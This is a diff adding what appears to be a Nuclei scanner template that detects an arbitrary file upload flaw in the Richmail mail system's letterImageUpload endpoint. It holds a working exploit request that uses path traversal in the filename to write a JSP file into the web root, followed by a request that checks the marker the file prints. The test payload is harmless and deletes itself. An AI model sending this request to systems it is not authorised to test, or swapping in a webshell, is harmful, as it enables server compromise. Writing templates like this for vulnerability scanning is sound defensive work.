@@ -1,0 +1,49 @@
+id: richmail-openapiservice-upload
+info:
+  name: "Richmail邮件系统letterImageUpload接口任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该模板用于检测letterImageUpload功能中存在的安全漏洞，攻击者可通过该接口实现任意文件上传，进而导致远程代码执行风险。
+    漏洞日期：2025-08-04
+  tags: Richmail
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /webadmin/service/openapiservice?func=upload:letterImageUpload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="imageX"
+
+    0
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="imageY"
+
+    0
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="submit"
+
+    提交
+    ------WebKitFormBoundary
+    Content-Disposition: form-data; name="filename"; filename="../../../../../web/webmailsvr/admin/NTest.jsp"
+    Content-Type: text/plain
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
